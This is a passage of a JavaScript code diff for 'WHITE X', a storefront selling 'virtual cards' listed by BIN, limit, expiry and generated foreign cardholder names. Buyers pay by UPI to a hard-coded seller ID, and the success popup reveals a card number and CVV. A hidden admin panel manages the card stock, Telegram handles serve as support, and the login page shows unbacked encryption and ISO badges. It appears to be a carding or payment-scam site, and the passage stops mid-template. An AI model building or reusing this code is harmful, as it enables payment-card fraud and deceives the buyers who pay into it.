+            selectedPackage = { price, network, bin, expiry, limit, cardHolder };
+            currentView = 'qr_payment';
+            render();
+        });
+        setTimeout(() => {
+            btn.classList.remove('pulse-glow');
+            btn.disabled = false;
+        }, 2000);
+    }
+
+    // ========== ADMIN PANEL ==========
+    function openAdminPanel() {
+        const overlay = document.getElementById('adminOverlay');
+        if (overlay) {
+            renderAdminPanel();
+            overlay.classList.add('active');
+        }
+    }
+
+    function closeAdminPanel() {
+        const overlay = document.getElementById('adminOverlay');
+        if (overlay) overlay.classList.remove('active');
+    }
+
+    function renderAdminPanel() {
+        const container = document.getElementById('adminPanelContainer');
+        if (!container) return;
+
+        let html = `
+            <div class="admin-header">
+                <h2><i class="fas fa-crown"></i> Admin Panel</h2>
+                <button class="admin-close-btn" onclick="closeAdminPanel()"><i class="fas fa-times"></i></button>
+            </div>
+        `;
+
+        html += `
+            <div class="admin-section">
+                <h3><i class="fas fa-qrcode"></i> UPI ID</h3>
+                <div class="admin-upi-row">
+                    <input type="text" id="adminUpiInput" value="${upiId}" placeholder="Enter UPI ID">
+                </div>
+            </div>
+        `;
+
+        const networks = ['VISA', 'Mastercard', 'RuPay'];
+        networks.forEach(net => {
+            const plans = packagesData[net] || [];
+            html += `
+                <div class="admin-section">
+                    <h3><i class="fab fa-cc-${net.toLowerCase() === 'visa' ? 'visa' : net.toLowerCase() === 'mastercard' ? 'mastercard' : 'rupee-sign'}"></i> ${net} <span class="badge-count">${plans.length} plans</span></h3>
+                    <div id="adminPlans_${net}">
+                `;
+
+            html += `
+                <div class="admin-row" style="font-size:0.6rem;color:#667;font-weight:600;padding:4px 0;">
+                    <span>Price</span>
+                    <span>Limit</span>
+                    <span>Expiry</span>
+                    <span>BIN</span>
+                    <span>Card Holder</span>
+                    <span>Best</span>
+                    <span>Action</span>
+                </div>
+                `;
+
+            plans.forEach((pkg, idx) => {
+                html += `
+                    <div class="admin-row">
+                        <input type="number" class="admin-price" value="${pkg.price}" data-net="${net}" data-idx="${idx}" placeholder="Price">
+                        <input type="number" class="admin-limit" value="${pkg.limit}" data-net="${net}" data-idx="${idx}" placeholder="Limit">
+                        <input type="text" class="admin-expiry" value="${pkg.expiry}" data-net="${net}" data-idx="${idx}" placeholder="MM/YYYY">
+                        <input type="text" class="admin-bin" value="${pkg.bin}" data-net="${net}" data-idx="${idx}" placeholder="BIN">
+                        <input type="text" class="admin-name" value="${pkg.cardHolder || generateForeignName()}" data-net="${net}" data-idx="${idx}" placeholder="Card Holder Name">
+                        <div style="display:flex;align-items:center;justify-content:center;">
+                            <input type="checkbox" class="admin-bestseller" ${pkg.bestSeller ? 'checked' : ''} data-net="${net}" data-idx="${idx}">
+                        </div>
+                        <button class="delete-btn" onclick="deletePlan('${net}', ${idx})"><i class="fas fa-trash"></i></button>
+                    </div>
+                `;
+            });
+
+            html += `
+                    <div class="admin-add-row">
+                        <input type="number" id="addPrice_${net}" placeholder="Price" class="admin-add-price">
+                        <input type="number" id="addLimit_${net}" placeholder="Limit" class="admin-add-limit">
+                        <input type="text" id="addExpiry_${net}" placeholder="MM/YYYY" class="admin-add-expiry">
+                        <input type="text" id="addBin_${net}" placeholder="BIN" class="admin-add-bin">
+                        <input type="text" id="addName_${net}" placeholder="Card Holder" class="admin-add-name">
+                        <button class="add-btn" onclick="addPlan('${net}')"><i class="fas fa-plus"></i> Add</button>
+                    </div>
+                </div>
+                `;
+        });
+
+        html += `
+            <button class="admin-save-btn" onclick="saveAdminChanges()"><i class="fas fa-save"></i> Save All Changes & Refresh</button>
+        `;
+
+        container.innerHTML = html;
+    }
+
+    function addPlan(network) {
+        const price = document.getElementById(`addPrice_${network}`)?.value;
+        const limit = document.getElementById(`addLimit_${network}`)?.value;
+        const expiry = document.getElementById(`addExpiry_${network}`)?.value;
+        const bin = document.getElementById(`addBin_${network}`)?.value;
+        const name = document.getElementById(`addName_${network}`)?.value || generateForeignName();
+
+        if (!price || !limit || !expiry || !bin) {
+            showToast('Please fill all fields!');
+            return;
+        }
+
+        if (!packagesData[network]) packagesData[network] = [];
+        packagesData[network].push({
+            price: parseInt(price),
+            limit: parseInt(limit),
+            expiry: expiry.trim(),
+            bin: bin.trim(),
+            cardHolder: name.trim() || generateForeignName(),
+            bestSeller: false
+        });
+
+        renderAdminPanel();
+        showToast('Plan added successfully!');
+    }
+
+    function deletePlan(network, idx) {
+        if (!confirm(`Delete this plan from ${network}?`)) return;
+        if (packagesData[network]) {
+            packagesData[network].splice(idx, 1);
+            renderAdminPanel();
+            showToast('Plan deleted!');
+        }
+    }
+
+    function saveAdminChanges() {
+        const upiInput = document.getElementById('adminUpiInput');
+        if (upiInput) upiId = upiInput.value.trim() || 'shivamxseller@fam';
+
+        const networks = ['VISA', 'Mastercard', 'RuPay'];
+        networks.forEach(net => {
+            const prices = document.querySelectorAll(`.admin-price[data-net="${net}"]`);
+            const limits = document.querySelectorAll(`.admin-limit[data-net="${net}"]`);
+            const expiries = document.querySelectorAll(`.admin-expiry[data-net="${net}"]`);
+            const bins = document.querySelectorAll(`.admin-bin[data-net="${net}"]`);
+            const names = document.querySelectorAll(`.admin-name[data-net="${net}"]`);
+            const bestsellers = document.querySelectorAll(`.admin-bestseller[data-net="${net}"]`);
+
+            const newPlans = [];
+            for (let i = 0; i < prices.length; i++) {
+                newPlans.push({
+                    price: parseInt(prices[i].value) || 0,
+                    limit: parseInt(limits[i].value) || 0,
+                    expiry: expiries[i].value || '01/2028',
+                    bin: bins[i].value || '000000',
+                    cardHolder: names[i]?.value || generateForeignName(),
+                    bestSeller: bestsellers[i] ? bestsellers[i].checked : false
+                });
+            }
+            packagesData[net] = newPlans;
+        });
+
+        saveData();
+        renderAdminPanel();
+        showToast('All changes saved successfully!');
+        render();
+    }
+
+    function showToast(msg) {
+        let toast = document.getElementById('adminToast');
+        if (!toast) {
+            toast = document.createElement('div');
+            toast.id = 'adminToast';
+            toast.className = 'admin-toast';
+            document.body.appendChild(toast);
+        }
+        toast.textContent = msg;
+        toast.classList.add('show');
+        clearTimeout(toast._timer);
+        toast._timer = setTimeout(() => toast.classList.remove('show'), 3500);
+    }
+
+    // ========== RENDER ENGINE ==========
+    function render() {
+        const root = document.getElementById('appRoot');
+        if (!root) return;
+
+        if (!isLoggedIn) {
+            root.innerHTML = renderLogin();
+            return;
+        }
+
+        if (showWelcome) {
+            root.innerHTML = renderWelcome();
+            return;
+        }
+
+        let html = renderMainApp();
+        root.innerHTML = html;
+
+        if (currentView === 'qr_payment' && selectedPackage) {
+            setTimeout(() => {
+                generateQR();
+            }, 300);
+        }
+
+        if (currentView === 'utr_confirm') {
+            setTimeout(() => {
+                const utrInput = document.getElementById('utrInput');
+                if (utrInput) {
+                    utrInput.addEventListener('input', function() {
+                        this.value = this.value.replace(/\D/g, '').slice(0, 12);
+                        const count = document.getElementById('utrCount');
+                        if (count) {
+                            count.textContent = `${this.value.length}/12`;
+                            count.className = 'utr-char-count' + (this.value.length === 12 ? ' valid' : '');
+                        }
+                        const error = document.getElementById('utrError');
+                        if (error) {
+                            if (this.value.length > 0 && this.value.length < 12) {
+                                error.textContent = `Please enter ${12 - this.value.length} more digit(s)`;
+                                error.classList.add('show');
+                            } else {
+                                error.classList.remove('show');
+                            }
+                        }
+                    });
+                }
+            }, 100);
+        }
+    }
+
+    // ========== LOGIN ==========
+    function renderLogin() {
+        return `
+            <div class="login-container">
+                <div class="login-card">
+                    <div class="login-header">
+                        <div class="security-badge"><i class="fas fa-shield-alt"></i> 256-bit Encrypted</div>
+                        <div class="neon-logo" onclick="adminTapHandler(event)">WHITE X</div>
+                        <div class="login-subtitle">Premium Fintech Platform</div>
+                    </div>
+
+                    <div class="card-vault">
+                        <div class="card-vault-inner">
+                            <div class="vault-card vault-card-1">
+                                <div class="card-glow"></div>
+                                <div class="card-top">
+                                    <span class="network-icon">VISA</span>
+                                    <span class="chip"></span>
+                                </div>
+                                <div class="card-number">•••• 4532 8912 3456</div>
+                                <div class="card-bottom">
+                                    <span>VALID THRU 01/28</span>
+                                    <span>✦ PREMIUM</span>
+                                </div>
+                            </div>
+                            <div class="vault-card vault-card-2">
+                                <div class="card-glow"></div>
+                                <div class="card-top">
+                                    <span class="network-icon">MASTERCARD</span>
+                                    <span class="chip"></span>
+                                </div>
+                                <div class="card-number">•••• 5412 7890 1234</div>
+                                <div class="card-bottom">
+                                    <span>VALID THRU 04/28</span>
+                                    <span>✦ WORLD</span>
+                                </div>
+                            </div>
+                            <div class="vault-card vault-card-3">
+                                <div class="card-glow"></div>
+                                <div class="card-top">
+                                    <span class="network-icon">RUPAY</span>
+                                    <span class="chip"></span>
+                                </div>
+                                <div class="card-number">•••• 6521 4567 8901</div>
+                                <div class="card-bottom">
+                                    <span>VALID THRU 03/28</span>
+                                    <span>✦ SELECT</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <button class="enter-btn" onclick="enterApp()">
+                        <i class="fas fa-arrow-right-to-bracket"></i> Enter Platform
+                    </button>
+
+                    <div class="login-features">
+                        <span><i class="fas fa-lock"></i> TLS 1.3</span>
+                        <span><i class="fas fa-globe"></i> ISO 27001</span>
+                        <span><i class="fas fa-clock"></i> 24/7 Support</span>
+                    </div>
+                </div>
+            </div>
+        `;
+    }
+
+    function enterApp() {
+        isLoggedIn = true;
+        showWelcome = true;
+        render();
+        setTimeout(() => {
+            showWelcome = false;
+            currentView = 'home';
+            render();
+        }, 2200);
+    }
+
+    // ========== WELCOME ==========
+    function renderWelcome() {
+        return `
+            <div class="welcome-overlay" style="background:radial-gradient(circle at 30% 30%, #0a0a1a, #000000);">
+                <div class="glass-card" style="max-width:400px;width:100%;padding:2rem 1.5rem;text-align:center;">
+                    <div style="font-size:3rem;margin-bottom:0.5rem;">🚀</div>
+                    <div class="neon-logo" style="font-size:2rem;">WHITE X</div>
+                    <p style="color:#88aacc;font-size:0.85rem;margin-top:0.3rem;">Welcome to <strong style="color:white;">White X</strong></p>
+                    <div class="loading-progress-bar">
+                        <div class="loading-fill" id="welcomeProgress" style="width:0%;"></div>
+                    </div>
+                    <p style="font-size:0.65rem;color:#778899;margin-top:0.5rem;">Loading your secure vault...</p>
+                </div>
+            </div>
+        `;
+    }
+
+    // ========== MAIN APP ==========
+    function renderMainApp() {
+        let html = '';
+
+        html += `
+            <div class="navbar">
+                <div class="neon-logo" onclick="adminTapHandler(event)">WHITE X</div>
+                <div class="nav-links">
+                    <a onclick="goHome()"><i class="fas fa-home"></i> Home</a>
+                    <a onclick="openSupport()"><i class="fas fa-headset"></i> Support</a>
+                    <a onclick="adminTapHandler(event)" style="cursor:pointer;color:#666;"><i class="fas fa-cog"></i></a>
+                    <span class="btn-outline" onclick="showLogoutPopup()" style="padding:0.2rem 0.8rem;font-size:0.7rem;"><i class="fas fa-sign-out-alt"></i> Logout</span>
+                </div>
+            </div>
+        `;
+
+        if (currentView === 'home') {
+            html += renderHome();
+        } else if (currentView === 'qr_payment' && selectedPackage) {
+            html += renderQRPayment();
+        } else if (currentView === 'utr_confirm') {
+            html += renderUTRConfirm();
+        } else {
+            html += renderHome();
+        }
+
+        html += `
+            <div class="admin-overlay" id="adminOverlay">
+                <div class="admin-panel" id="adminPanelContainer"></div>
+            </div>
+            <div class="admin-toast" id="adminToast"></div>
+
+            <!-- Logout Popup -->
+            <div class="logout-popup-overlay" id="logoutPopup">
+                <div class="logout-popup">
+                    <div class="logout-icon"><i class="fas fa-sign-out-alt"></i></div>
+                    <h2>Logout?</h2>
+                    <p>Are you sure you want to logout from ${SITE_NAME}?</p>
+                    <div class="logout-domain"><i class="fas fa-globe"></i> ${DOMAIN}</div>
+                    <div class="btn-group">
+                        <button class="btn-primary" onclick="confirmLogout()"><i class="fas fa-check"></i> Yes, Logout</button>
+                        <button class="btn-cancel-logout" onclick="closeLogoutPopup()"><i class="fas fa-times"></i> Cancel</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Thank You Animation -->
+            <div class="thankyou-overlay" id="thankyouOverlay">
+                <div class="thankyou-content">
+                    <div class="thankyou-icon"><i class="fas fa-check-circle"></i></div>
+                    <h1>Thank You!</h1>
+                    <p>You have been successfully logged out.</p>
+                    <div class="sparkles">✨✨✨</div>
+                    <div class="thankyou-sub"><i class="fas fa-clock"></i> See you again soon!</div>
+                    <div class="thankyou-logo">WHITE X</div>
+                </div>
+            </div>
+
+            <!-- Fail Popup -->
+            <div class="fail-popup-overlay" id="failPopup">
+                <div class="fail-popup">
+                    <div class="fail-icon-big"><i class="fas fa-times-circle"></i></div>
+                    <h2>Payment Failed!</h2>
+                    <p class="sub-text">Your payment was not received.</p>
+                    <div class="fail-details">
+                        <div class="row"><span class="label">Status</span><span class="value">Failed</span></div>
+                        <div class="row"><span class="label">Reason</span><span class="value">Payment not received</span></div>
+                        <div class="row"><span class="label">Code</span><span class="value">ERR-PAY-403</span></div>
+                    </div>
+                    <div class="support-contact">
+                        <i class="fab fa-telegram"></i> Contact us on Telegram: <a href="https://t.me/xronxsell" target="_blank" class="tg-link">@xronxsell</a>
+                    </div>
+                    <div class="btn-group">
+                        <button class="btn-primary" onclick="closeFailPopupAndRetry()"><i class="fas fa-redo"></i> Retry Payment</button>
+                        <button class="btn-outline" onclick="closeFailPopupAndGoHome()">Go Home</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Success Popup -->
+            <div class="success-popup-overlay" id="successPopup">
+                <div class="success-popup">
+                    <div class="success-icon-big"><i class="fas fa-check-circle"></i></div>
+                    <h2>Payment Successful!</h2>
+                    <p class="sub-text">Your virtual card has been generated.</p>
+                    <div class="card-details" id="cardDetailsContainer">
+                        <div class="row"><span class="label">Network</span><span class="value" id="cardNetwork">VISA</span></div>
+                        <div class="row"><span class="label">Card Number</span><span class="value" id="cardNumber">****</span></div>
+                        <div class="row"><span class="label">Card Holder</span><span class="value" id="cardHolderName">---</span></div>
+                        <div class="row"><span class="label">Expiry</span><span class="value" id="cardExpiry">MM/YY</span></div>
+                        <div class="row"><span class="label">CVV</span><span class="value" id="cardCvv">***</span></div>
+                        <div class="row"><span class="label">Limit</span><span class="value" id="cardLimit">₹0</span></div>
+                        <div class="row"><span class="label">Amount Paid</span><span class="value" id="cardAmount">₹0</span></div>
+                    </div>
+                    <div class="btn-group">
+                        <button class="btn-primary" onclick="closeSuccessPopup()"><i class="fas fa-check"></i> Done</button>
+                    </div>
+                </div>
+            </div>
+        `;
+
+        return html;
+    }
+
+    // ========== HOME ==========
+    function renderHome() {
+        if (!packagesData[activeNetwork] || packagesData[activeNetwork].length === 0) {
+            packagesData[activeNetwork] = [];
+        }
+
+        const plans = packagesData[activeNetwork] || [];
+
+        let html = `
+            <div class="hero">
+                <div class="hero-left">
+                    <div class="neon-logo" onclick="adminTapHandler(event)">WHITE X</div>
+                    <h1>Premium Virtual Cards</h1>
+                    <p style="color:#99aacc;">Instant delivery • Secure • Best rates</p>
+                    <div class="feature-row">
+                        <span class="feature-chip"><i class="fas fa-bolt"></i> Instant</span>
+                        <span class="feature-chip"><i class="fas fa-shield"></i> Secure</span>
+                        <span class="feature-chip"><i class="fas fa-credit-card"></i> All networks</span>
+                    </div>
+                </div>
+                <div class="hero-right">
+                    <div class="glow-rings">
+                        <div class="ring ring-1"></div>
+                        <div class="ring ring-2"></div>
+                        <div class="ring ring-3"></div>
+                    </div>
+                    <div class="card-vault" style="height:200px;margin:0;">
+                        <div class="card-vault-inner" style="animation: vaultRotate 12s ease-in-out infinite;">
+                            <div class="vault-card vault-card-1" style="width:200px;height:130px;">
+                                <div class="card-glow"></div>
+                                <div class="card-top">
+                                    <span class="network-icon">VISA</span>
+                                    <span class="chip"></span>
+                                </div>
+                                <div class="card-number">•••• 4532 8912 3456</div>
+                                <div class="card-bottom">
+                                    <span>VALID THRU 01/28</span>
+                                    <span>✦ PREMIUM</span>
+                                </div>
+                            </div>
+                            <div class="vault-card vault-card-2" style="width:200px;height:130px;">
+                                <div class="card-glow"></div>
+                                <div class="card-top">
+                                    <span class="network-icon">MASTERCARD</span>
+                                    <span class="chip"></span>
+                                </div>
+                                <div class="card-number">•••• 5412 7890 1234</div>
+                                <div class="card-bottom">
+                                    <span>VALID THRU 04/28</span>
+                                    <span>✦ WORLD</span>
+                                </div>
+                            </div>
+                            <div class="vault-card vault-card-3" style="width:200px;height:130px;">
+                                <div class="card-glow"></div>
+                                <div class="card-top">
+                                    <span class="network-icon">RUPAY</span>
+                                    <span class="chip"></span>
+                                </div>
+                                <div class="card-number">•••• 6521 4567 8901</div>
+                                <div class="card-bottom">
+                                    <span>VALID THRU 03/28</span>
+                                    <span>✦ SELECT</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="packages-section">
+                <div class="section-title">Choose Your Card</div>
+                <div class="section-subtitle">Select network &amp; plan — delivered instantly after payment</div>
+
+                <div class="tabs">
+                    ${['VISA', 'Mastercard', 'RuPay'].map(net => `
+                        <button class="tab-btn ${net === activeNetwork ? 'active' : ''}" onclick="switchNetwork('${net}')">
+                            <img src="${NETWORK_LOGOS[net]}" alt="${net}" onerror="this.style.display='none'">
+                            ${net}
+                            <span class="plan-count-badge">${(packagesData[net] || []).length}</span>
+                        </button>
+                    `).join('')}
+                </div>
+
+                <div class="cards-grid">
+            `;
+
+        if (plans.length === 0) {
+            html += `<div style="text-align:center;padding:2rem;color:#8899aa;width:100%;">No plans available for this network. Add via Admin panel.</div>`;
+        } else {
+            plans.forEach((pkg, idx) => {
+                const isBestSeller = pkg.bestSeller || false;
+                const cardHolder = pkg.cardHolder || generateForeignName();
+                html += `
+                        <div class="package-card" style="${isBestSeller ? 'border-color: #ff44aa; box-shadow: 0 0 20px rgba(255,68,170,0.2);' : ''}">
+                            ${isBestSeller ? '<div style="position:absolute;top:-4px;right:-4px;background:#ff44aa;color:white;padding:0.15rem 0.8rem;border-radius:30px;font-size:0.55rem;font-weight:700;z-index:5;">⭐ BEST SELLER</div>' : ''}
+                            <div class="card-type-display">
+                                <img src="${CARD_IMAGES[activeNetwork] || 'https://via.placeholder.com/44x28'}" alt="${activeNetwork}" onerror="this.style.display='none'">
+                                <span class="network-name">${activeNetwork}</span>
+                            </div>
+                            <div class="card-holder-name"><i class="fas fa-user"></i> ${cardHolder}</div>
+                            <div class="feature-icons">
+                                <span class="ficon"><i class="fas fa-bolt"></i> Instant</span>
+                                <span class="ficon"><i class="fas fa-shield-alt"></i> Secure</span>
+                                <span class="ficon"><i class="fas fa-globe"></i> Global</span>
+                            </div>
+                            <div class="limit-expiry-row">
+                                <div class="info-card-box">
+                                    <div class="meta-label">Limit</div>
+                                    <div class="meta-value">${formatINR(pkg.limit)}</div>
+                                </div>
+                                <div class="info-card-box">
+                                    <div class="meta-label">Expiry</div>
+                                    <div class="meta-value">${pkg.expiry}</div>
+                                </div>
+                                <div class="info-card-box">
+                                    <div class="meta-label">BIN</div>
+                                    <div class="meta-value">${pkg.bin}</div>
+                                </div>
+                            </div>
+                            <div style="display:flex;justify-content:space-between;align-items:center;">
+                                <span class="price-tag">${formatINR(pkg.price)}</span>
+                                <span class="badge-stock"><i class="fas fa-check-circle"></i> In Stock</span>
+                            </div>
+                            <button class="btn-primary" onclick="handleBuyNowWithAnimation(event, this, ${pkg.price}, '${activeNetwork}', '${pkg.bin}', '${pkg.expiry}', ${pkg.limit}, '${cardHolder}')">
+                                <i class="fas fa-credit-card"></i> Buy Now
+                            </button>
+                        </div>
+                    `;
+            });
+        }
+
+        html += `
+                </div>
+            </div>
+
+            <div class="support-section" id="support">
+                <div class="section-title" style="font-size:1.4rem;">Need Help?</div>
+                <div class="section-subtitle">We're here for you 24/7</div>
+                <div class="support-grid">
+                    <div class="support-card" onclick="window.open('https://t.me/xronxsell', '_blank')">
+                        <i class="fab fa-telegram"></i>
+                        <h3>Telegram Support</h3>
+                        <p>Get instant help from our team</p>
+                        <div class="telegram-username">@xronxsell</div>
+                        <span class="telegram-btn"><i class="fab fa-telegram"></i> Chat Now</span>
+                    </div>
+                </div>
+            </div>
+
+            <footer>
+                <div class="neon-logo" onclick="adminTapHandler(event)">WHITE X</div>
+                <p>&copy; 2025 White X Fintech. All rights reserved. | <a href="#" style="color:#88aaff;">Terms</a> · <a href="#" style="color:#88aaff;">Privacy</a></p>
+            </footer>
+        `;
+
+        return html;
+    }
+
+    // ========== QR PAYMENT ==========
+    function renderQRPayment() {
+        if (!selectedPackage) return '<div>Error: No package selected.</div>';
+
+        const { price, network, bin, expiry, limit, cardHolder } = selectedPackage;
+
+        return `
+            <div class="page-with-back">
+                <div class="back-btn-wrapper">
+                    <button class="back-btn" onclick="goHome()"><i class="fas fa-arrow-left"></i> Back to plans</button>
+                </div>
+                <div class="qr-container glass-card" style="padding:1.5rem;">
+                    <h2 style="text-align:center;font-size:1.2rem;">Complete Payment</h2>
+                    <p style="text-align:center;color:#88aacc;font-size:0.8rem;">Scan QR or use UPI ID to pay</p>
+
+                    <div style="margin:0.8rem 0;text-align:center;">
+                        <div style="background:rgba(0,255,200,0.1);border:1px solid rgba(0,255,200,0.3);border-radius:0.8rem;padding:0.6rem;display:inline-block;">
+                            <span style="color:cyan;">${formatINR(price)}</span>
+                            <span style="color:#8899aa;margin-left:8px;">• ${network}</span>
+                            <span style="color:#8899aa;margin-left:8px;">• Limit ${formatINR(limit)}</span>
+                        </div>
+                    </div>
+
+                    <div class="qr-canvas-wrapper">
+                        <div class="qr-placeholder" id="qrPlaceholder">
+                            <i class="fas fa-qrcode"></i>
+                            <span>Scan to Pay</span>
+                            <span class="upi-id">${upiId}</span>
+                        </div>
+                        <canvas class="qr-canvas" id="qrCanvas" style="display:none;"></canvas>
+                    </div>
+
+                    <div class="qr-download-wrapper">
+                        <button class="qr-download-btn" onclick="downloadQR()">
+                            <i class="fas fa-download"></i> Download QR Code
+                        </button>
+                    </div>
+
+                    <div style="text-align:center;margin:0.8rem 0 0.5rem;">
+                        <div style="background:rgba(0,0,0,0.3);border-radius:0.8rem;padding:0.6rem;display:inline-block;">
+                            <span style="color:#aaa;font-size:0.7rem;">UPI ID: </span>
+                            <span style="color:white;font-weight:600;font-size:0.9rem;">${upiId}</span>
+                            <button onclick="copyUPI()" style="background:transparent;border:1px solid #00ffff44;color:cyan;border-radius:30px;padding:0.1rem 0.6rem;font-size:0.6rem;cursor:pointer;margin-left:6px;"><i class="fas fa-copy"></i></button>
+                        </div>
+                    </div>
+
+                    <div style="display:flex;gap:10px;margin-top:0.5rem;">
+                        <button class="btn-success" style="flex:1;justify-content:center;" onclick="confirmPayment()"><i class="fas fa-check-circle"></i> I've Paid</button>
+                        <button class="btn-cancel" style="flex:1;justify-content:center;" onclick="cancelPayment()"><i class="fas fa-times"></i> Cancel</button>
+                    </div>
+
+                    <div style="margin-top:0.8rem;font-size:0.65rem;color:#6a8a9a;text-align:center;">
+                        <i class="fas fa-clock"></i> Payment expires in 15 minutes • After payment, click "I've Paid"
+                    </div>
+                </div>
+            </div>
+        `;
+    }
+
+    function generateQR() {
+        const canvas = document.getElementById('qrCanvas');
+        const placeholder = document.getElementById('qrPlaceholder');
+        if (!canvas) return;
+
+        try {
+            const amount = selectedPackage ? selectedPackage.price : 0;
+            const upiString = `upi://pay?pa=${upiId}&pn=White%20X&am=${amount}&cu=INR`;
+            const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(upiString)}&bgcolor=ffffff&color=000000&margin=15`;
+
+            if (placeholder) placeholder.style.display = 'none';
+            canvas.style.display = 'block';
+
+            const img = new Image();
+            img.crossOrigin = 'anonymous';
+            img.onload = function() {
+                const ctx = canvas.getContext('2d');
+                const size = 240;
+                canvas.width = size;
+                canvas.height = size;
+                ctx.fillStyle = 'white';
+                ctx.fillRect(0, 0, size, size);
+                ctx.drawImage(img, 12, 12, size - 24, size - 24);
+            };
+            img.onerror = function() {
+                if (placeholder) {
+                    placeholder.style.display = 'flex';
+                    canvas.style.display = 'none';
+                }
+            };
+            img.src = qrUrl;
+        } catch (e) {
+            if (placeholder) {
+                placeholder.style.display = 'flex';
+                canvas.style.display = 'none';
+            }
+        }
+    }
+
+    function downloadQR() {
+        const canvas = document.getElementById('qrCanvas');
+        if (!canvas) {
+            showToast('QR not ready yet. Please wait.');
+            return;
+        }
+
+        try {
+            // Create a new canvas with white background and QR
+            const downloadCanvas = document.createElement('canvas');
+            const size = 400;
+            downloadCanvas.width = size;
+            downloadCanvas.height = size;
+            const ctx = downloadCanvas.getContext('2d');
+
+            // White background
+            ctx.fillStyle = 'white';
+            ctx.fillRect(0, 0, size, size);
+
+            // Draw QR from existing canvas
+            const qrSize = size - 40;
+            const offset = 20;
+            ctx.drawImage(canvas, offset, offset, qrSize, qrSize);
+
+            // Add border
+            ctx.strokeStyle = '#00ffff';
+            ctx.lineWidth = 3;
+            ctx.strokeRect(5, 5, size - 10, size - 10);
+
+            // Create download link
+            const link = document.createElement('a');
+            link.download = `WHITE_X_QR_${Date.now()}.png`;
+            link.href = downloadCanvas.toDataURL('image/png');
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+
+            showToast('QR Code downloaded successfully! ✅');
+        } catch (e) {
+            console.error('Download error:', e);
+            showToast('Error downloading QR. Please try again.');
+        }
+    }
+
+    function copyUPI() {
+        navigator.clipboard?.writeText(upiId).then(() => {
+            showToast('UPI ID copied!');
+        }).catch(() => {
+            const input = document.createElement('input');
+            input.value = upiId;
+            document.body.appendChild(input);
+            input.select();
+            document.execCommand('copy');
+            document.body.removeChild(input);
+            showToast('UPI ID copied!');
+        });
+    }
+
+    function confirmPayment() {
+        showLoadingTransition(() => {
+            currentView = 'utr_confirm';
+            render();
+        });
+    }
+
+    function cancelPayment() {
+        selectedPackage = null;
+        currentView = 'home';
+        render();
+    }
+
+    // ========== LOGOUT POPUP ==========
+    function showLogoutPopup() {
+        const popup = document.getElementById('logoutPopup');
+        if (popup) popup.classList.add('active');
+    }
+
+    function closeLogoutPopup() {
+        const popup = document.getElementById('logoutPopup');
+        if (popup) popup.classList.remove('active');
+    }
+
+    function confirmLogout() {
+        closeLogoutPopup();
+        const thankyou = document.getElementById('thankyouOverlay');
+        if (thankyou) {
+            thankyou.classList.add('active');
+            setTimeout(() => {
+                isLoggedIn = false;
+                showWelcome = false;
+                currentView = 'home';
+                selectedPackage = null;
+                render();
+                setTimeout(() => {
+                    thankyou.classList.remove('active');
+                }, 500);
+            }, 2500);
+        } else {
+            isLoggedIn = false;
+            showWelcome = false;
+            currentView = 'home';
+            selectedPackage = null;
+            render();
+        }
+    }
+
+    // ========== FAIL POPUP ==========
+    function showFailPopup() {
+        const popup = document.getElementById('failPopup');
+        if (popup) popup.classList.add('active');
+    }
+
+    function closeFailPopupAndRetry() {
+        const popup = document.getElementById('failPopup');
+        if (popup) popup.classList.remove('active');
+        currentView = 'utr_confirm';
+        render();
+    }
+
+    function closeFailPopupAndGoHome() {
+        const popup = document.getElementById('failPopup');
+        if (popup) popup.classList.remove('active');
+        selectedPackage = null;
+        currentView = 'home';
+        render();
+    }
+
+    // ========== SUCCESS POPUP ==========
+    function showSuccessPopup(cardData) {
+        const popup = document.getElementById('successPopup');
+        if (!popup) return;
+
+        document.getElementById('cardNetwork').textContent = cardData.network || 'VISA';
+        document.getElementById('cardNumber').textContent = cardData.cardNumber || '****';
+        document.getElementById('cardHolderName').textContent = cardData.cardHolder || '---';
+        document.getElementById('cardExpiry').textContent = cardData.expiry || 'MM/YY';
+        document.getElementById('cardCvv').textContent = cardData.cvv || '***';
+        document.getElementById('cardLimit').textContent = formatINR(cardData.limit || 0);
+        document.getElementById('cardAmount').textContent = formatINR(cardData.amount || 0);
+
+        popup.classList.add('active');
+    }
+
+    function closeSuccessPopup() {
+        const popup = document.getElementById('successPopup');
+        if (popup) popup.classList.remove('active');
+        selectedPackage = null;
+        currentView = 'home';
+        render();
+    }
+
+    // ========== UTR CONFIRM ==========
+    function renderUTRConfirm() {
+        if (!selectedPackage) return '<div>Error: No package selected.</div>';
+
+        const { price, network, bin, expiry, limit, cardHolder } = selectedPackage;
+
+        return `
+            <div class="page-with-back">
+                <div class="back-btn-wrapper">
+                    <button class="back-btn" onclick="goHome()"><i class="fas fa-arrow-left"></i> Back to plans</button>
+                </div>
+                <div class="utr-container glass-card" style="padding:1.5rem;">
+                    <h2 style="text-align:center;font-size:1.2rem;">Verify Transaction</h2>
+                    <p style="text-align:center;color:#88aacc;font-size:0.8rem;">Enter 12-digit UTR number to verify your payment</p>
+
+                    <div style="margin:1rem 0;">
+                        <div style="background:rgba(0,255,200,0.05);border:1px solid rgba(0,255,200,0.2);border-radius:0.8rem;padding:0.8rem;">
+                            <div style="display:flex;justify-content:space-between;color:#aaa;font-size:0.7rem;margin-bottom:0.3rem;">
+                                <span>Amount</span>
+                                <span style="color:cyan;font-weight:600;">${formatINR(price)}</span>
+                            </div>
+                            <div style="display:flex;justify-content:space-between;color:#aaa;font-size:0.7rem;">
+                                <span>Network</span>
+                                <span style="color:white;">${network}</span>
+                            </div>
+                            <div style="display:flex;justify-content:space-between;color:#aaa;font-size:0.7rem;">
+                                <span>Card Holder</span>
+                                <span style="color:white;">${cardHolder}</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="input-group">
+                        <label class="input-label">12-Digit UTR Number</label>
+                        <input type="text" class="input-field utr-input" id="utrInput" placeholder="Enter 12-digit UTR" maxlength="12" inputmode="numeric">
+                        <div class="utr-char-count" id="utrCount">0/12</div>
+                        <div class="utr-error" id="utrError">Please enter 12 digits</div>
+                    </div>
+
+                    <div style="display:flex;gap:10px;margin-top:0.5rem;">
+                        <button class="btn-success" style="flex:1;justify-content:center;" onclick="submitUTR()"><i class="fas fa-paper-plane"></i> Verify UTR</button>
